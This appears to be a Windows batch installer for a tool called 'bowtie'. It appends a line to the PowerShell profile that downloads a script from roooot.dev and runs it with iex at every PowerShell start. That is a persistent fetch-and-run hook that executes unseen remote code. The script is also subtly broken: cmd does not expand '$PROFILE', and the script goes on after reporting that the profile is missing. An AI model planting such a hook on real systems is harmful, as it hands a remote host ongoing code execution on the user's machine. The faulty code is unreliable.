@echo off

set "profilePath=$PROFILE"

if not exist "%profilePath%" (
    echo "[ - ] $PROFILE not found"
)

echo iex(iwr https://roooot.dev/ps/bt.ps1) >> "%profilePath%"

echo "[ + ] installed bowtie. restart or open powershell"
pause
